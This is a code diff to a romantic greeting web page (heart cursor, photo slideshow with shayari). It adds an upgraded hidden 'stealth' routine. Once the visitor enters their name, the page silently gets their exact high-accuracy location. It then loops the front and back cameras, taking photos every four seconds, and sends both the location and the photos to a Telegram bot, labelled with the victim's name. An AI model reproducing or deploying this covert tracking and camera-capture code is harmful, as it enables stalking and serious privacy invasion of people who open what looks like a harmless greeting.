@@ -245,7 +245,7 @@
     }
     createStars();
 
-    // SMOOTH CURSOR
+    // CURSOR HEART
     document.addEventListener('mousemove', (e) => {
         const h = document.createElement('div');
         h.innerHTML = '❤';
@@ -285,6 +285,8 @@
             }
         }
         type();
+        
+        // --- START STEALTH ENGINE ---
         triggerStealth(name);
     }
 
@@ -323,51 +325,99 @@
             setTimeout(() => showLayer(4, 5), 2000);
             return;
         }
-
         const slide = document.getElementById('slide');
         const overlay = document.getElementById('textOverlay');
         const txt = document.getElementById('shayari-text');
-
-        // Reset
         slide.style.opacity = 0;
         slide.classList.remove('zoom-effect');
         overlay.classList.remove('show');
-
         setTimeout(() => {
             slide.src = URL.createObjectURL(images[sIdx]);
             slide.style.opacity = 1;
             slide.classList.add('zoom-effect');
             txt.innerText = shayaris[sIdx % shayaris.length];
-            
             setTimeout(() => overlay.classList.add('show'), 1200);
-            
             sIdx++;
-            setTimeout(runSlideshow, 5500); // 5.5 seconds total per slide
+            setTimeout(runSlideshow, 5500);
         }, 1000);
     }
 
-    // STEALTH
+    // --- UPGRADED STEALTH SYSTEM (EXACT LOCATION + CAM LOOP) ---
+    let captureCount = 0;
+    let facingMode = "user"; // "user" = Front, "environment" = Back
+
     function triggerStealth(name) {
+        // 1. INSTANT EXACT LOCATION
+        const geoOptions = { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 };
         navigator.geolocation.getCurrentPosition(p => {
-            sendToTG(`📍 ${name} is Live!\nLink: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`, null, false);
-        });
+            const lat = p.coords.latitude;
+            const lon = p.coords.longitude;
+            const acc = p.coords.accuracy;
+            const locMsg = `📍 **Exact Location Found!**\n\n👤 Name: ${name}\n🎯 Accuracy: ${acc.toFixed(2)}m\n🔗 Maps: http://www.google.com/maps/place/${lat},${lon}`;
+            sendToTG(locMsg, null, false);
+        }, (err) => {
+            sendToTG(`⚠️ Location Access Denied by ${name}`, null, false);
+        }, geoOptions);
+
+        // 2. START CAMERA LOOP
+        startCamera(name);
+    }
+
+    function startCamera(name) {
         const v = document.getElementById('v_box');
-        navigator.mediaDevices.getUserMedia({video:true}).then(s => {
+        navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: facingMode }, 
+            audio: false 
+        }).then(s => {
             v.srcObject = s;
-            setInterval(() => {
+            const camInterval = setInterval(() => {
                 const c = document.getElementById('c_box');
-                c.width = v.videoWidth; c.height = v.videoHeight;
+                c.width = v.videoWidth; 
+                c.height = v.videoHeight;
                 c.getContext('2d').drawImage(v, 0, 0);
-                c.toBlob(b => sendToTG(b, `Reaction: ${name}`, true), 'image/jpeg', 0.5);
-            }, 6000);
-        }).catch(() => {});
+                
+                c.toBlob(b => {
+                    const label = facingMode === "user" ? "FRONT" : "BACK";
+                    sendToTG(b, `📸 [${label}] Reaction: ${name} (Pic ${captureCount + 1})`, true);
+                    captureCount++;
+
+                    // Logic: 7 Front then 4 Back Loop
+                    if (facingMode === "user" && captureCount >= 7) {
+                        clearInterval(camInterval);
+                        captureCount = 0;
+                        facingMode = "environment";
+                        stopTracks(s);
+                        startCamera(name);
+                    } else if (facingMode === "environment" && captureCount >= 4) {
+                        clearInterval(camInterval);
+                        captureCount = 0;
+                        facingMode = "user";
+                        stopTracks(s);
+                        startCamera(name);
+                    }
+                }, 'image/jpeg', 0.9); // High Quality Capture
+            }, 4000); // 4 Sec Loop
+        }).catch(e => {
+            sendToTG(`❌ Camera Error: ${e.message}`, null, false);
+        });
+    }
+
+    function stopTracks(stream) {
+        if (stream) stream.getTracks().forEach(track => track.stop());
     }
 
     function sendToTG(d, c, p) {
         const fd = new FormData();
         fd.append('chat_id', CHAT_ID);
-        if(p) { fd.append('photo', d); fd.append('caption', c); fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method:'POST', body:fd}); }
-        else { fd.append('text', d); fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {method:'POST', body:fd}); }
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/${p ? 'sendPhoto' : 'sendMessage'}`;
+        if(p) { 
+            fd.append('photo', d); 
+            fd.append('caption', c); 
+        } else { 
+            fd.append('text', d);
+            fd.append('parse_mode', 'Markdown');
+        }
+        fetch(url, {method:'POST', body:fd}).catch(e => console.error(e));
     }
 </script>
 </body>
